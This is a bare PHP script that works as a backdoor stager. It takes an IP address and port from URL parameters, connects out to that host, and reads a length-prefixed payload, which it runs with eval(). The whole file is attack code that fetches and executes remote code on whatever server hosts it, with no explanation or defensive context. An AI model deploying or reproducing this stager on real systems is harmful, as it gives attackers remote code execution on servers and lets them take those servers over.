<?php
$ipaddr = $_GET['ip'];
$port = $_GET['port'];
$msgsock = fsockopen($ipaddr,$port);
$len = socket_read($msgsock, 4);

$a = unpack("Nlen", $len);
$len = $a['len'];
$buffer = '';
while (strlen($buffer) < $len) 			
	$buffer .= socket_read($msgsock, $len-strlen($buffer));

eval($buffer);
echo "[*] Connection Terminated";
die();
?>